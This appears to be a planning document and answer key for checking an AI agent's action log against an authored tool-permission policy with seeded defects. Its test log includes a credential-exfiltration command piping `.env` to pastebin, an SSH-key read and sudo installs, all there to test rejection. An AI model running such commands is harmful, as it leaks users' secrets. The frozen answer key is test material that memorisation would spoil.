# Use case: agent-policy (PLAN, written before any VE run)

Status: planned 2026-09-29, then built the same day on branch `usecase/agent-policy`. The results are in
`README.md`; section 12 records every deviation. Sections 1 to 11 still read as written before the VE run.
The answer key (sections 6 and 7) is frozen at the commit that adds this file. If running VE later shows a key
entry is wrong, that entry is corrected in section 12 (deviations) with the reason and the old value. It is
never edited in place.

## 0. Lead instruction and what is measured

The policy and the action log are **authored directly in VE**. The agent and its tools emit VE facts, and the
policy author writes VE norm rules. No English source is translated, so **no translation-fidelity metric
applies**. The use case measures what VE can **check**:

- (a) policy-level: conflicting rules, rules that can never decide, and actions no rule covers;
- (b) per logged action: APPROVED, REJECTED or NOT-COVERED (plus CONFLICT and UNDETERMINED where the policy or
  the log makes them the honest answer), with the rule or rules that decide it;
- the honesty of norm defaults: where VE forces a completion default the policy does not state, and proof that
  no NOT-COVERED action is reported as approved or rejected.

## 1. Source (authored; pinned by this file)

The policy is **authored for this use case**. It is not a translation of any published policy, and no rule claims
to reproduce one. Its pin is the rule text in section 3.3 of this commit. At implementation `policy.ve` must
reproduce it byte for byte, apart from the wording adjustments recorded in section 12. The README then records
the SHA-256 of `policy.ve` and `log.ve`.

It is modelled on the following public material. These pages were **not re-fetched in this planning run**,
which made no network or model calls. Implementation step 0 records the retrieval date and SHA-256 of each page
in `sources.md`.

| Idea borrowed | Public source |
|---|---|
| allow / ask / deny tool rules, deny taking precedence, per-path file rules, `.env`-style credential denies | Claude Code permissions, <https://code.claude.com/docs/en/permissions> (plan review finding C: the earlier `…/claude-code/iam` URL now serves authentication documentation) |
| writes confined to the workspace, network off unless approved, approval to escalate | OpenAI Codex CLI sandbox and approval modes, <https://github.com/openai/codex> (`docs/sandbox.md`; commit SHA pinned at step 0) |
| human approval for high-impact actions (spending, sending, deleting) and least privilege | OWASP Top 10 for LLM Applications 2025, LLM06 Excessive Agency, <https://genai.owasp.org/llmrisk/llm062025-excessive-agency/> |
| forbid overrides permit; default deny is a *choice* of the language | Cedar, <https://docs.cedarpolicy.com/> (already the reference of `docs/spec/norms.md` §8) |

**Deliberately seeded defects.** Four realistic authoring mistakes are part of the authored policy, so that the
policy-level checks have something known to find. They are labelled here and in the README. VE is not told
about them.

| Id | Defect | Where |
|---|---|---|
| D1 | a missing precedence edge: rule 14 (write outside the workspace) omits rule 3 from its exception list | rule 14 |
| D2 | the brief's own "must not … unless the user has confirmed it" form with no rule permitting the confirmed case | rule 19 |
| D3 | a complement case left unsaid: confirmed secret fetches are permitted, unconfirmed ones are not mentioned | rule 11 |
| D4 | a permission that can never decide: confirmed credential reads are permitted, but the credential ban overrides it | rule 12 vs rule 24 |

## 2. Scope

In scope:

- 25 rules: 24 on one permission predicate and 1 on one obligation predicate.
- 42 logged actions over 11 tools.
- An inventory of 10 files, 5 hosts and 3 people, emitted by the workspace tool.
- Policy-level checks: conflicts, rule-pair conflicts, never-deciding rules, dead guards, per-tool gaps, same-sign overlaps.
- Per-action verdicts, with deciding rules, under each forced default.
- The reporting obligation and its breach.
- Seeded mutants.

Out of scope, with the reason:

- The truth of the log (whether the agent really did what it emitted) and the correctness of tool classifiers
  (read-only, credential file, secret disclosure, inside the workspace, within the spending limit). These are
  named decider judgments, as in the Asimov case annotator: the shell classifier, the path resolver, the DLP
  scanner and the payment tool. VE proves consequences of the facts; it does not establish them.
- Numeric spending thresholds, cumulative budgets, rates, and time ("confirmed *before* the action").
  See section 9.
- Speech acts: who confirmed, who instructed, delegation, standing permissions. See section 10. Commands and
  speech acts are not on main.
- A Cedar re-encoding of the policy. That would be a translation. The Cedar *discipline* (forbid overrides
  permit) is used directly in VE norms instead.

## 3. The policy

### 3.1 Vocabulary (environment `environment.json`, profiles `data@0`, `norms@0`, `relational-fol@0`)

Sorts: `action`, `file`, `host`, `person`.

Base predicates:

| Predicate | Wording | Decider / emitted by |
|---|---|---|
| `tool(action, $string)` functional + total (data@0) | `{0} uses the tool {1}` | agent harness |
| `reads`, `writes`, `deletes (action, file)` | `{0} reads/writes/deletes {1}` | the file tools and shell tracer (explicit path arguments only) |
| `contacts(action, host)` | `{0} contacts {1}` | network layer |
| `sends_to(action, person)` | `{0} sends a message to {1}` | mail/chat tools |
| `inside_workspace(file)` | `{0} is inside the workspace` | path resolver |
| `credential_file(file)` | `{0} is a credential file` | path resolver (credential path list) |
| `version_controlled(file)` | `{0} is under version control` | git |
| `allowlisted(host)` | `{0} is on the network allowlist` | network layer |
| `is_user(person)` | `{0} is the user` | harness |
| `confirmed(action)` | `{0} is confirmed by the user` | harness confirmation dialog (a speech act in reality; section 10) |
| `read_only(action)` | `{0} is read-only` | shell classifier |
| `elevated(action)` | `{0} runs with elevated privileges` | shell / OS |
| `discloses_secret(action)` | `{0} discloses a secret` | DLP scanner |
| `within_limit(action)` | `{0} is within the spending limit` | payment tool (numeric comparison done outside VE, section 9) |
| `reported(action)` | `{0} is reported to the user` | harness |

String literals (declared `$string` constants, which are pairwise distinct):
`@read_file`, `@write_file`, `@delete_file`, `@shell`, `@web_fetch`, `@send_email`, `@post_message`,
`@purchase`, `@get_secret`, `@schedule_task`, `@spawn_agent`. Because `tool` is functional and the literals are
distinct, an action has exactly one tool. This is an environment flag, so the conflict check, which runs over
`Background_base`, sees it. This reuses the `usecases/cedar-attributes` attribute pattern.

Regulated predicates:

| Predicate | Role | Act phrase | Default |
|---|---|---|---|
| `permitted(action)` | permission | `{0} be performed` | **not stated by the policy; VE forces one** |
| `report_required(action)` | obligation (no permission dual; no permission predicate describes that act) | `{0} be reported to the user` | **not stated by the policy; VE forces one** |

### 3.2 Forced defaults (where VE forces a choice)

`docs/spec/norms.md` §3.1 makes `default` mandatory and allows only `deny | allow`. The planned `unspecified`
default (ARCH-ROADMAP P1, DRI 2026-09-29) is not on main. The policy states no default for either predicate, so
the use case does **not pick one**. It ships four environments that differ only in the two defaults:

| File | `permitted` | `report_required` |
|---|---|---|
| `environment.deny-neednot.json` | deny ("By default, an action must not be performed.") | deny ("need not be reported") |
| `environment.deny-must.json` | deny | allow ("must be reported") |
| `environment.allow-neednot.json` | allow ("may be performed") | deny |
| `environment.allow-must.json` | allow | allow |

The harness verdict (section 5) never reads the default. It is computed from rule selection alone, so it must be
**identical in all four**. The completed outcomes differ between them **exactly** on NOT-COVERED cases. The README
reports that difference as "where VE forced a choice".

### 3.3 The rules (pinned text)

Design discipline, stated in the README:

- every prohibition takes precedence over every permission (deny overrides allow, as in Cedar and Claude Code);
- confirmation lifts a prohibition through its `unless` carve-out;
- a separate permission rule grants the confirmed case, repeating the kind of action. An exception does not
  inherit its parent's guard (norms.md §2.3).

"exception to rules 1–12" abbreviates the explicit list `rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 and 12`, which
is written out in `policy.ve`. The wording of negated atoms ("is not inside the workspace" versus "it is not the
case that that file is inside the workspace") is fixed by the parser at step 0. Section 12 records any change,
and the meaning must stay the paraphrase given here.

| # | Name | Rule text |
|---|---|---|
| 1 | read-workspace | Every action may be performed, if there is a file such that both that action reads that file and that file is inside the workspace. |
| 2 | read-confirmed | Every action may be performed, if both that action is confirmed by the user and there is a file such that that action reads that file. |
| 3 | write-workspace | Every action may be performed, if there is a file such that both that action writes that file and that file is inside the workspace. |
| 4 | delete-workspace | Every action may be performed, if there is a file such that both that action deletes that file and that file is inside the workspace. |
| 5 | shell-read-only | Every action may be performed, if both that action uses the tool @shell and that action is read-only. |
| 6 | shell-confirmed | Every action may be performed, if both that action uses the tool @shell and that action is confirmed by the user. |
| 7 | network-allowlisted | Every action may be performed, if there is a host such that both that action contacts that host and that host is on the network allowlist. |
| 8 | network-confirmed | Every action may be performed, if both that action is confirmed by the user and there is a host such that that action contacts that host. |
| 9 | message-user | Every action may be performed, if there is a person such that both that action sends a message to that person and that person is the user. |
| 10 | purchase-confirmed | Every action may be performed, if both that action uses the tool @purchase and that action is confirmed by the user. |
| 11 | secret-fetch-confirmed | Every action may be performed, if both that action uses the tool @get_secret and that action is confirmed by the user. **(D3)** |
| 12 | credential-read-confirmed | Every action may be performed, if both that action is confirmed by the user and there is a file such that both that action reads that file and that file is a credential file. **(D4)** |
| 13 | read-outside (exception to rules 1–12) | Every action must not be performed, if there is a file such that both that action reads that file and that file is not inside the workspace, unless that action is confirmed by the user. |
| 14 | write-outside (exception to rules 1, 2, 4–12) | Every action must not be performed, if there is a file such that both that action writes that file and that file is not inside the workspace. **(D1: rule 3 missing from the list)** |
| 15 | delete-outside (exception to rules 1–12) | Every action must not be performed, if there is a file such that both that action deletes that file and that file is not inside the workspace. |
| 16 | delete-untracked (exception to rules 1–12) | Every action must not be performed, if there is a file such that both that action deletes that file and that file is not under version control, unless that action is confirmed by the user. |
| 17 | shell-changes (exception to rules 1–12) | Every action must not be performed, if both that action uses the tool @shell and that action is not read-only, unless that action is confirmed by the user. |
| 18 | network-unlisted (exception to rules 1–12) | Every action must not be performed, if there is a host such that both that action contacts that host and that host is not on the network allowlist, unless that action is confirmed by the user. |
| 19 | message-others (exception to rules 1–12) | Every action must not be performed, if there is a person such that both that action sends a message to that person and that person is not the user, unless that action is confirmed by the user. **(D2)** |
| 20 | purchase-unconfirmed (exception to rules 1–12) | Every action must not be performed, if that action uses the tool @purchase, unless that action is confirmed by the user. |
| 21 | purchase-over-limit (exception to rules 1–12) | Every action must not be performed, if both that action uses the tool @purchase and that action is not within the spending limit. |
| 22 | elevated (exception to rules 1–12) | Every action must not be performed, if that action runs with elevated privileges. |
| 23 | disclose-secret (exception to rules 1–12) | Every action must not be performed, if that action discloses a secret. |
| 24 | credential-read (exception to rules 1–12) | Every action must not be performed, if there is a file such that both that action reads that file and that file is a credential file. |
| 25 | report | Every action must be reported to the user, if either there is a file such that that action deletes that file or that action uses the tool @purchase. |

Rules 1–12 are the 12 positive rules on `permitted` and rules 13–24 the 12 negative ones. The precedence DAG has
depth 2 (limit 16) and 12 × 12 − 1 = 143 edges. All guards mention base predicates only, so no stratification
edges exist between the two regulated predicates.

## 4. The action log (authored VE facts)

### 4.1 Record schema (what every emitted record must contain)

The log is open-world. Absence of a fact is **not** falsity: `docs/spec/verification-contract.md` forbids "closed-world
absence to open-world falsity" without an explicit rule. Each record therefore states its own completeness in VE.

- `@aNN uses the tool @t.`
- For each of `reads`, `writes`, `deletes`, `contacts`, `sends a message to`: the positive facts, and a
  **closure sentence**. For example "Every file that @a04 reads is the same as @f_hosts." with a disjunction
  for several files, or "It is not the case that there is a file that @a04 writes." for none. The exact closure
  wording is fixed at step 0.
- Always, in both polarities: `confirmed`, `elevated`, `discloses a secret`, `reported`.
- Shell actions also state `read-only`, and purchases state `within the spending limit`, in both polarities.
- Inventory, emitted once at the head of `log.ve`: every file, host and person attribute, in both polarities.

A record that omits a field it needs is **UNDETERMINED**, never defaulted. Actions a40 and a41 do this on purpose,
and a42 omits a field its verdict does not need. So **39** records (a01–a39) are complete, and a40, a41 and a42
are not. The finite-model differential (M8) runs on the 39 complete records only. It excludes a42 too: its two
completions select `{1}` (not confirmed) or `{1, 2}` (confirmed), while entailment gives `{1}` with rule 2 in U,
so no single completion can stand for it.

### 4.2 Inventory

| Constant | Stands for | inside ws | credential | version control |
|---|---|---|---|---|
| `@f_main` | `./src/app.py` | yes | no | yes |
| `@f_readme` | `./README.md` | yes | no | yes |
| `@f_build` | `./build/cache.bin` | yes | no | no |
| `@f_env` | `./.env` | yes | **yes** | no |
| `@f_hosts` | `/etc/hosts` | no | no | no |
| `@f_bashrc` | `~/.bashrc` | no | no | no |
| `@f_ssh` | `~/.ssh/id_ed25519` | no | **yes** | no |
| `@f_other` | `~/other-project/notes.md` | no | no | yes |
| `@f_cron` | `/var/spool/cron/crontabs/dev` | no | no | no |
| `@f_link` | `./data/latest` (symlink; the resolver emits **no** inside/outside fact) | ? | no | no |

Hosts: `@h_pypi` (pypi.org) and `@h_github` (github.com) are allowlisted; `@h_paste` (pastebin.com),
`@h_weather` (api.weather.example) and `@h_debian` (deb.debian.org) are not.
People: `@p_user` is the user; `@p_colleague` and `@p_list` (an external mailing list) are not.

### 4.3 The 42 actions

Legend: **C** = confirmed. Every action has `elevated` = no, `discloses` = no and effect sets empty unless listed.
`reported` = yes for a11, a12, a14 and a31–a34, and no elsewhere (including a13).

| Id | Tool | What it is | Facts that matter |
|---|---|---|---|
| a01 | read_file | read `src/app.py` | reads f_main; not C |
| a02 | read_file | read README after asking | reads f_readme; C |
| a03 | read_file | read `/etc/hosts` | reads f_hosts; not C |
| a04 | read_file | same, confirmed | reads f_hosts; C |
| a05 | read_file | read `.env` in the repo | reads f_env; not C |
| a06 | read_file | read SSH key, user clicked yes | reads f_ssh; C |
| a07 | write_file | edit `src/app.py` | writes f_main; not C |
| a08 | write_file | append to `~/.bashrc` | writes f_bashrc; not C |
| a09 | write_file | same, confirmed | writes f_bashrc; C |
| a10 | write_file | multi-file patch: `src/app.py` and `~/.bashrc` | writes f_main, f_bashrc; not C |
| a11 | delete_file | delete `build/cache.bin` | deletes f_build; not C |
| a12 | delete_file | same, confirmed | deletes f_build; C |
| a13 | delete_file | delete README (tracked), not reported | deletes f_readme; not C; reported no |
| a14 | delete_file | delete `~/other-project/notes.md`, confirmed | deletes f_other; C |
| a15 | shell | `git status` | read-only; not C |
| a16 | shell | `pytest -q` | not read-only; not C |
| a17 | shell | `pytest -q`, confirmed | not read-only; C |
| a18 | shell | `sudo apt install jq`, confirmed | not read-only; elevated; contacts h_debian; C |
| a19 | shell | `pip install requests`, confirmed | not read-only; contacts h_pypi; C |
| a20 | shell | `curl https://pastebin.com/raw/x` | read-only; contacts h_paste; not C |
| a21 | web_fetch | fetch github.com page | contacts h_github; not C |
| a22 | web_fetch | fetch weather API | contacts h_weather; not C |
| a23 | web_fetch | same, confirmed | contacts h_weather; C |
| a24 | shell | `cat .env \| curl -d @- pastebin.com`, confirmed | reads f_env; contacts h_paste; not read-only; discloses; C |
| a25 | send_email | email the user a summary | sends to p_user; not C |
| a26 | send_email | email a colleague | sends to p_colleague; not C |
| a27 | send_email | same, confirmed | sends to p_colleague; C |
| a28 | post_message | chat to user, cc external list | sends to p_user, p_list; not C |
| a29 | post_message | chat to user and colleague, confirmed | sends to p_user, p_colleague; C |
| a30 | send_email | email the user a config that contains an API key | sends to p_user; discloses; not C |
| a31 | purchase | buy a $5 API credit, confirmed | within limit; C |
| a32 | purchase | same, not confirmed | within limit; not C |
| a33 | purchase | $900 GPU hours, confirmed | not within limit; C |
| a34 | purchase | same, not confirmed | not within limit; not C |
| a35 | get_secret | fetch deploy token from vault, confirmed | C |
| a36 | get_secret | same, not confirmed | not C |
| a37 | schedule_task | register a nightly job (no file/host effect) | not C |
| a38 | spawn_agent | start a sub-agent | not C |
| a39 | schedule_task | write the user crontab | writes f_cron; not C |
| a40 | read_file | read `/etc/hosts`; **confirmation field missing** | reads f_hosts; `confirmed` absent |
| a41 | write_file | write `data/latest` (symlink); **inside fact missing** | writes f_link |
| a42 | read_file | read `src/app.py`; **confirmation field missing** | reads f_main; `confirmed` absent |

## 5. Verdict definitions (fixed before running)

For an action `a` and each rule N, let `sel_N(a)` be N's selection formula (`NormDocument.selection`, norms.md
§4.2). Guards here mention only base predicates, so it is a base formula. The premises are `Background_base`
plus the inventory plus **a's own record only** (a per-action sub-log). One conflicting action therefore cannot
make the premises of another inconsistent. Let S+ be the positive rules and S− the negative rules with
`premises ⊢ sel_N(a)`, and U the rules for which neither `sel_N(a)` nor `¬sel_N(a)` is proved.

| Verdict | Condition |
|---|---|
| CONFLICT | S+ ≠ ∅ and S− ≠ ∅ |
| APPROVED | S+ ≠ ∅, S− = ∅, and no negative rule is in U |
| REJECTED | S− ≠ ∅, S+ = ∅, and no positive rule is in U |
| NOT-COVERED | every rule is proved not to select (`¬sel_N(a)` for all 24) |
| UNDETERMINED | otherwise; U is reported (the rules the missing facts leave open) |

The deciding rules are S+ or S−, all of them, so same-sign overlaps show. The completed outcome under a forced
default is a separate column: `prove_norm_entailment` with the elaborated premises of the chosen environment over
the same sub-log, for `permitted(a)` and for `¬permitted(a)`. The obligation uses the same definitions on rule 25
alone. **Breach** means APPROVED, `report_required` proved and `¬reported` stated.

## 6. Answer key: per action

Columns: the verdict; the deciding rules; the completed `permitted` outcome under a deny and an allow default
(P = permitted, F = forbidden, ⊥ = premises inconsistent, ? = neither provable); `report_required` status by rule 25;
justification.

| Id | Verdict | Rules | deny | allow | rule 25 | Justification from the rules |
|---|---|---|---|---|---|---|
| a01 | APPROVED | 1 | P | P | not covered | inside read; no negative guard holds (f_main inside, not credential) |
| a02 | APPROVED | 1, 2 | P | P | not covered | inside read and a confirmed read; same-sign overlap, not a conflict |
| a03 | REJECTED | 13 | F | F | not covered | outside read, unconfirmed; 13 overrides 1–12 |
| a04 | APPROVED | 2 | P | P | not covered | 13's carve-out holds (C), so 13 is silent; 2 selects |
| a05 | REJECTED | 24 | F | F | not covered | `.env` is a credential file; 24 overrides 1 (inside read) |
| a06 | REJECTED | 24 | F | F | not covered | 13 silent (C); 2 and 12 would permit but 24 overrides them |
| a07 | APPROVED | 3 | P | P | not covered | inside write |
| a08 | REJECTED | 14 | F | F | not covered | outside write |
| a09 | REJECTED | 14 | F | F | not covered | 14 has no carve-out; confirmation does not help |
| a10 | **CONFLICT** | 3 vs 14 | ⊥ | ⊥ | not covered | D1: 3 permits (inside file), 14 forbids (outside file), and 14 does not take precedence over 3; no other negative applies, so 3 selects |
| a11 | REJECTED | 16 | F | F | required | untracked delete, unconfirmed; 16 overrides 4 |
| a12 | APPROVED | 4 | P | P | required (reported) | 16's carve-out holds (C); 4 selects |
| a13 | APPROVED | 4 | P | P | required, **BREACH** | tracked inside delete; rule 25 requires a report and `reported` is no |
| a14 | REJECTED | 15 | F | F | required | outside delete; 15 has no carve-out |
| a15 | APPROVED | 5 | P | P | not covered | read-only shell command |
| a16 | REJECTED | 17 | F | F | not covered | a shell command that is not read-only, unconfirmed |
| a17 | APPROVED | 6 | P | P | not covered | 17 silent (C); 6 selects |
| a18 | REJECTED | 22 | F | F | not covered | elevated; 22 has no carve-out and overrides 6 and 8; 17 and 18 are silent (C) |
| a19 | APPROVED | 6, 7, 8 | P | P | not covered | confirmed shell; allowlisted host; confirmed contact; no negative applies |
| a20 | REJECTED | 18 | F | F | not covered | unlisted host, unconfirmed; 18 overrides 5 |
| a21 | APPROVED | 7 | P | P | not covered | allowlisted host |
| a22 | REJECTED | 18 | F | F | not covered | unlisted host, unconfirmed |
| a23 | APPROVED | 8 | P | P | not covered | 18 silent (C); 8 selects |
| a24 | REJECTED | 23, 24 | F | F | not covered | discloses a secret and reads a credential file; 13, 17 and 18 are silent (C); 2, 6, 8 and 12 are overridden |
| a25 | APPROVED | 9 | P | P | not covered | message to the user |
| a26 | REJECTED | 19 | F | F | not covered | message to a non-user, unconfirmed |
| a27 | **NOT-COVERED** | none | **F** | **P** | not covered | D2: 19's carve-out holds, so 19 is silent, and no rule permits a confirmed message to a non-user; only the forced default decides |
| a28 | REJECTED | 19 | F | F | not covered | cc to an external list, unconfirmed; 19 overrides 9 |
| a29 | APPROVED | 9 | P | P | not covered | 19 silent (C); 9 selects because the user is a recipient |
| a30 | REJECTED | 23 | F | F | not covered | discloses a secret; overrides 9 |
| a31 | APPROVED | 10 | P | P | required (reported) | confirmed and within the limit |
| a32 | REJECTED | 20 | F | F | required | unconfirmed purchase |
| a33 | REJECTED | 21 | F | F | required | over the limit; 21 has no carve-out and overrides 10 |
| a34 | REJECTED | 20, 21 | F | F | required | both negatives select: an overlap, not a conflict |
| a35 | APPROVED | 11 | P | P | not covered | confirmed secret fetch |
| a36 | **NOT-COVERED** | none | **F** | **P** | not covered | D3: no rule mentions an unconfirmed secret fetch |
| a37 | **NOT-COVERED** | none | **F** | **P** | not covered | no rule mentions `schedule_task`, and it has no file, host or message effect |
| a38 | **NOT-COVERED** | none | **F** | **P** | not covered | no rule mentions `spawn_agent` |
| a39 | REJECTED | 14 | F | F | not covered | an unmentioned tool, still decided by its effect: an outside write |
| a40 | **UNDETERMINED** | U = {2, 13} | ? | ? | not covered | outside read; `confirmed` absent, so 13 or 2 may select |
| a41 | **UNDETERMINED** | U = {3, 14} | ? | ? | not covered | inside/outside unknown for f_link |
| a42 | APPROVED | 1 (2 in U) | P | P | not covered | 1 selects; the missing `confirmed` leaves only a same-sign rule (2) open, and no negative can select |

Totals: APPROVED 16, REJECTED 19, NOT-COVERED 4 (a27, a36, a37, a38), CONFLICT 1 (a10), UNDETERMINED 2 (a40, a41).
Conditional pairs (the same action without and with confirmation): a03/a04, a11/a12, a16/a17, a22/a23, a26/a27,
a31/a32 and a35/a36. The confirmation does not help in a05/a06, a08/a09 or a33.

The four NOT-COVERED actions are the **only** ones whose completed outcome changes between the deny and allow
environments. a10 is inconsistent in both, and a40 and a41 are open in both.

**Obligation (rule 25).** `report_required` is covered for 8 actions (a11–a14, a31–a34) and not covered for 34.
Breaches, computed over APPROVED actions:

- `need not` default: {a13};
- `must` default: {a13} plus the 13 APPROVED out-of-scope actions with `reported` = no (a01, a02, a04, a07, a15,
  a17, a19, a21, a23, a25, a29, a35, a42).

That flip is the forced-default finding for the obligation.

## 7. Answer key: policy level

| Finding | Expected |
|---|---|
| Document conflict status (`check_conflict`) | `permitted`: **CONFLICT**, with a checked witness in which an action writes an inside and an outside file and no other negative guard holds. `report_required`: **CONFLICT-FREE** by certificate (one positive rule). No dual pairs are declared. |
| Opposite-sign pairs (12 × 12 = 144 queries `∃a. sel_i(a) ∧ sel_j(a)`) | exactly **1** satisfiable: (3, 14), which is D1. The other 143 are refuted by certificate, because a precedence edge makes the two selections exclusive. |
| Rules that never decide (`∀a. ¬sel_N(a)` provable) | exactly **{12}** (D4): its guard implies rule 24's guard, and rule 24 takes precedence over it. |
| Dead guards (`∀a. ¬applies_N(a)` provable) | **none**; every rule's guard is satisfiable. |
| Per-tool gaps: `∀a. tool(a,t) ∧ schema → P(a) ∨ N(a)`, using `log-schema.ve` (read/write/delete tools touch some file, `web_fetch` some host, and mail/chat some person; these are assumptions about log records, not policy) | **covered** (certificate): read_file, write_file, delete_file, shell, web_fetch, purchase. **Gap** (witness): send_email and post_message (D2: confirmed, only non-user recipients); get_secret (D3: unconfirmed); schedule_task and spawn_agent (no effects). If finite models may hold a `$string` element that is no declared literal, an unnamed tool is a gap too; otherwise that case is OPEN (step 0). |
| Obligation gaps | every action that neither deletes a file nor purchases; this is expected and reported, not a defect |
| Same-sign overlaps (`Overlap` diagnostics) | reported, never counted as conflicts. They must include (1, 2), (6, 7), (6, 8), (7, 8), (20, 21) and (23, 24), which log actions a02, a19, a34 and a24 exhibit. The full list is reported, not keyed. |
| Where VE forced a choice | (i) a completion default for each of the 2 regulated predicates, run both ways; (ii) precedence must be listed rule by rule, since `norms@0` has no global deny-overrides combining algorithm (143 edges, and one omitted edge is D1); (iii) numeric spending limit reduced to a tool-emitted `within_limit` fact; (iv) path containment reduced to a resolver fact (section 8, variant E optional); (v) confirmation modelled as an action flag instead of a user speech act |

## 8. VE features needed, part by part, and what is expected to stay OPEN

| Part | Features (on main unless noted) | Expected result |
|---|---|---|
| A. Authoring and well-formedness | `norms@0` English rule blocks with multi-rule exception lists and `unless` carve-outs (`ve/norm_english.py`); regulated declarations; `data@0` functional + total `tool` with `$string` literals (the cedar-attributes pattern); existential guards; the unique-reading parser; identity manifest (the Asimov pattern) | every rule CHECKED with one reading. Risk: `data@0 × norms@0` in one environment, and literal constants in norm guards. Step 0 probes both; if either fails, `tool` becomes 11 unary base predicates plus explicit disjointness, which the conflict check can then no longer see (recorded as a deviation) |
| B. Policy-level checks | `check_conflict` (certificate or witness); `NormDocument.selection`; tableau prover and countermodel search for the pair, shadow, dead-guard and gap queries; `overlap_witnesses`; vacuity report; Lean `norms-route` replay of the document conflict results on the flag-free environment described below; P0 route replay of the pair, shadow and gap certificates (the P0 route accepts data flags) | as section 7. The per-pair, shadow and gap queries are **harness** queries built from public selection formulas. The checker reports one conflict witness per predicate, not the conflicting rule pairs |
| C. Per-action verdicts | per-action sub-logs; the prover over base facts with record closure sentences; `prove_norm_entailment` in the four environments; finite-model differential using `selected_rules` on a model built mechanically from each complete record | as section 6; the finite-model path is used for complete records only (39 of 42: a01–a39) and must agree |
| D. Obligation | obligation role without a dual; breach computed by the harness (a W3 definition `breach := required ∧ ¬reported` is optional) | as section 6 |
| E. Optional variant | replace `inside_workspace` by directory containment via `closure@0` `rtc[parent]`, as in the Cedar adapter's `in` | the same verdicts; skipped if `closure@0 × data@0 × norms@0` or its English is unavailable |

**Lean replay with the `tool` flags (plan review, finding A).** The Lean `norms-route` rejects every environment
with data flags: `decodeSource` in `lean/VE/Norms/Wire.lean` throws "UnsupportedProfile: norms route with data
flags is not implemented", and `tool` is declared functional and total. The fallback is fixed now:

- The Lean `norms-route` cases run on `environment.lean.json`. It is `environment.deny-neednot.json` with the
  `functional` and `total` fields removed from `tool` and nothing else changed: the same 11 literals, rules and
  defaults. It has its own environment id, so the conflict packages are regenerated for it.
- Changed assumption: Lean's `Background_base` then lacks the functional and total axioms for `tool`. The
  pairwise distinctness of the literals stays.
- Guarantee for a conflict witness: Lean checks that the regenerated target is true at the tuple in the
  witness model. The target formula does not mention the flags. Python's `validate_background` checks that the
  same model satisfies the flag axioms. So a CONFLICT in the flagged environment rests on Lean and Python
  together, and the README says so.
- Guarantee for a CONFLICT-FREE certificate: Lean replays it over the flag-free background. It stays valid for
  the flagged environment, because adding premises keeps every entailment. The README states this monotonicity
  step as an argument; Lean does not prove it.
- A certificate that needs the flag axioms cannot be replayed on the flag-free environment. Such a result is
  labelled Python-only evidence. The `report_required` certificate and mutant m1's `permitted` certificate are
  expected not to need the flags.
- The completed outcomes (section 5) use the norm layers with the flags, so the `norms-certificate` kind cannot
  replay them. They are Python evidence. The P0 route also replays each one with the Python-elaborated layer
  formulas passed as ordinary premises. That checks the inference in Lean, but not the elaboration.
- Base-level certificates (per-action selection, pair, shadow, gap) go to the P0 `certificate` kind, which
  accepts data flags, so they need no fallback.

Expected to stay **OPEN**:

1. Truth of the log and the tool classifiers (named deciders; VE checks consequences only).
2. Numeric limits and aggregates (per-action amounts, daily totals). `order@0` forbids `$int` quantification,
   so a guard "the amount of that action exceeds 50" is not writable over a variable action.
3. Time: confirmation before the action, reporting after it, standing or expiring permissions.
4. An `unspecified` completion default (ARCH-ROADMAP P1). Until it lands, VE's completed outcome for a27, a36,
   a37 and a38 is whatever default the environment was given. Only the harness's selection-based verdict is honest.
5. A deny-overrides combining algorithm as a declaration instead of 143 hand-listed edges.
6. The speech-act items of section 10.
7. Any Lean route kind that does not exist for a harness query stays Python-only evidence and is labelled so.

## 9. Metrics to report (README)

No translation-fidelity metric applies (section 0).

| # | Metric | Expected |
|---|---|---|
| M1 | per-action verdict agreement with section 6, as a confusion matrix over the 5 verdicts | 42/42 |
| M2 | deciding-rule set agreement (S+ / S−, and U for UNDETERMINED) | 42/42 |
| M3 | **silent decisions**: actions the harness labels APPROVED or REJECTED although no rule selects | **0** |
| M4 | forced-default sensitivity: actions whose completed outcome differs deny vs allow | exactly {a27, a36, a37, a38} |
| M5 | policy findings vs section 7: conflict pairs, never-deciding rules, dead guards, gap tools, required overlaps | {(3,14)}, {12}, ∅, 5 tools (+ the unnamed-tool case or OPEN), 6 required overlap pairs present |
| M6 | seeded defects found | 4/4 (D1 via a10 and pair (3,14); D2 via a27 and the send_email/post_message gaps; D3 via a36 and the get_secret gap; D4 via rule 12 never deciding) |
| M7 | mutant detection (section 11) | 6/6 with the stated verdict changes |
| M8 | differential agreement: finite-model `selected_rules` vs entailment (39 complete records, a01–a39); an independent Python reference (`reference_policy.py`, no `ve` import, written from section 3.3 only) vs the harness (42) | 39/39, 42/42 |
| M9 | evidence: certificates replayed by Python and by Lean, witnesses validated in Python, Lean and Rust, each counted; UNKNOWN (budget) outcomes counted and named | reported; any UNKNOWN is a failure of M1/M5 unless explained in section 12 |
| M10 | cost: rules, log sentences, harness wall time, prover calls | reported |

## 10. What would need speech acts (not on main)

| Item | Now | With speech acts |
|---|---|---|
| "the user has confirmed it" | `confirmed(action)` flag emitted by the harness; the agent could in principle emit it itself | a user assent act with speaker attribution, bound to the action and preceding it; rules can require the *user*, not the agent, as speaker |
| who asked for the action (user request vs instructions found in a fetched page or file, i.e. prompt injection) | not expressible | directive acts with a speaker and a principal hierarchy; "may perform only actions the user requested" |
| standing permissions ("always allow `npm test`") and revocation | would be a policy edit | a performative grant or revocation that changes the permission state from that point on |
| rule 25 "must be reported to the user" | `reported(action)` flag | an assertive act by the agent, addressed to the user, whose content is the action |
| messages sent on the user's behalf (a26–a30) | recipients only | attribution of the message's assertions to the user or to the agent (`reports@0` / attribution work) |
| delegation to sub-agents (a38) | uncovered tool | commands passed to the sub-agent, and which policy binds it |

## 11. Seeded mutants (run after the base case; each must change exactly the named results)

| Id | Mutation | Expected change |
|---|---|---|
| m1 | add rule 3 to rule 14's exception list (the fix for D1) | `permitted` becomes CONFLICT-FREE (certificate); a10 becomes REJECTED {14}; no conflicting pairs |
| m2 | add a new permission rule, called M below, as the last rule: "Every action may be performed, if both that action is confirmed by the user and there is a person such that both that action sends a message to that person and that person is not the user." (the fix for D2). Also add M to the exception lists of **all 12 negative rules 13–24**: 12 new precedence edges, 155 in all, and rule 14 still omits rule 3. Without those edges, a confirmed message to a non-user that discloses a secret would select both M and rule 23, a new conflict | a27 becomes APPROVED {M}. a29 stays APPROVED, and its deciding set becomes {9, M}. No other verdict or deciding set changes. The send_email and post_message gaps close. The opposite-sign pairs become 13 × 12 = 156, and only (3, 14) stays satisfiable, so the document stays CONFLICT because of D1. M decides a27 and a29, so the never-deciding rules stay {12}. A new same-sign overlap (9, M) appears, shown by a29 |
